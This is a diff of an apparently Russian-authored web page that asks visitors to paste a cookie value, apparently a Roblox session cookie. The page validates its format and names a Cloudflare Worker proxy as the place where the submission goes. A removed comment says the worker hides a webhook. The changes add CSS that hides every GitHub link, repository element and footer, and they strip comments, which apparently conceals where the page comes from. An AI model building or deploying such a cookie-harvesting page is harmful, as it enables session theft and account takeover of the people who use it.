@@ -9,10 +9,9 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none; /* чтобы нельзя было выделить текст */
+            user-select: none;
         }
 
-        /* ========== ПЕРЕМЕННЫЕ ТЕМ ========== */
         :root {
             --bg-gradient-1: #0a0a0f;
             --bg-gradient-2: #120c1f;
@@ -65,7 +64,6 @@
             padding: 20px;
             position: relative;
             overflow-x: hidden;
-            transition: background 0.3s ease;
         }
 
         @keyframes gradientShift {
@@ -74,7 +72,6 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* ========== ЗВЁЗДЫ ========== */
         .stars {
             position: fixed;
             top: 0;
@@ -97,7 +94,6 @@
             100% { opacity: 1; transform: scale(1.3); }
         }
 
-        /* ========== ЛЕТАЮЩИЕ ПЕЧЕНЬКИ ========== */
         .floating-cookie {
             position: fixed;
             pointer-events: none;
@@ -114,7 +110,6 @@
             100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
         }
 
-        /* ========== ОСНОВНАЯ КАРТОЧКА ========== */
         .glass-card {
             background: var(--card-bg);
             backdrop-filter: blur(20px);
@@ -134,7 +129,6 @@
             box-shadow: 0 30px 55px rgba(0, 0, 0, 0.4), 0 0 45px var(--accent);
         }
 
-        /* ========== ЛОГОТИП ========== */
         .logo {
             text-align: center;
             margin-bottom: 36px;
@@ -165,7 +159,6 @@
             text-shadow: 0 0 5px var(--accent);
         }
 
-        /* ========== ИНПУТ ========== */
         .label {
             color: var(--text-secondary);
             font-size: 14px;
@@ -193,7 +186,6 @@
             box-shadow: 0 0 18px var(--accent);
         }
 
-        /* ========== СТАТУС ========== */
         .status {
             font-size: 13px;
             margin: 18px 0 28px;
@@ -208,7 +200,6 @@
             font-weight: 500;
         }
 
-        /* ========== КНОПКА ========== */
         .btn {
             width: 100%;
             background: linear-gradient(135deg, var(--btn-gradient-1), var(--btn-gradient-2), var(--btn-gradient-3));
@@ -236,7 +227,6 @@
             transform: none;
         }
 
-        /* ========== СООБЩЕНИЯ ========== */
         .message-area {
             text-align: center;
             margin-top: 24px;
@@ -252,7 +242,6 @@
             border-left: 3px solid #ff5a4a;
         }
 
-        /* ========== ПЕРЕКЛЮЧАТЕЛЬ ТЕМЫ ========== */
         .theme-switch {
             position: fixed;
             top: 24px;
@@ -277,7 +266,6 @@
             border-color: var(--accent);
         }
 
-        /* ========== АНИМАЦИЯ ТРЯСКИ ========== */
         @keyframes shake {
             0%,100%{transform:translateX(0)}
             25%{transform:translateX(-5px)}
@@ -285,6 +273,16 @@
         }
         .shake {
             animation: shake 0.2s ease;
+        }
+
+        /* Скрываем всё, что может вести на GitHub */
+        .github-link, [href*="github"], [class*="repo"], footer, .footer {
+            display: none !important;
+            visibility: hidden !important;
+            height: 0 !important;
+            width: 0 !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
         }
     </style>
 </head>
@@ -309,10 +307,10 @@
 
 <script>
     (function(){
-        // ========== ТВОЙ CLOUDFLARE WORKER (ВЕБХУК СПРЯТАН) ==========
+        // ========== ТВОЙ WORKER ==========
         const PROXY_URL = "https://robl.megadoner517.workers.dev";
 
-        // ========== ТЕМА (СВЕТ / ТЕМНОТА) ==========
+        // ТЕМА
         const themeBtn = document.getElementById('themeToggleBtn');
         function loadTheme(){
             const saved = localStorage.getItem('rbx_theme');
@@ -338,7 +336,7 @@
         if(themeBtn) themeBtn.addEventListener('click', toggleTheme);
         loadTheme();
 
-        // ========== ЗВЁЗДЫ ==========
+        // ЗВЁЗДЫ
         function createStars(){
             const container = document.getElementById('stars');
             for(let i=0;i<150;i++){
@@ -355,7 +353,7 @@
         }
         createStars();
 
-        // ========== ЛЕТАЮЩИЕ ПЕЧЕНЬКИ ==========
+        // ПЕЧЕНЬКИ
         for(let i=0;i<40;i++){
             let cookie = document.createElement('div');
             cookie.classList.add('floating-cookie');
@@ -367,7 +365,7 @@
             document.body.appendChild(cookie);
         }
 
-        // ========== ЛОГИКА САЙТА ==========
+        // ЛОГИКА
         const cookieInput = document.getElementById('cookie');
         const sendBtn = document.getElementById('sendBtn');
         const statusDiv = document.getElementById('status');
@@ -392,7 +390,7 @@
                 statusDiv.style.color = '#22c55e';
                 sendBtn.disabled = false;
             } else {
-                statusDiv.innerHTML = '<span>❌</span> Неверный формат куки. Проверьте значение.';
+                statusDiv.innerHTML = '<span>❌</span> Неверный формат куки.';
                 statusDiv.style.color = '#ef4444';
                 sendBtn.disabled = true;
             }
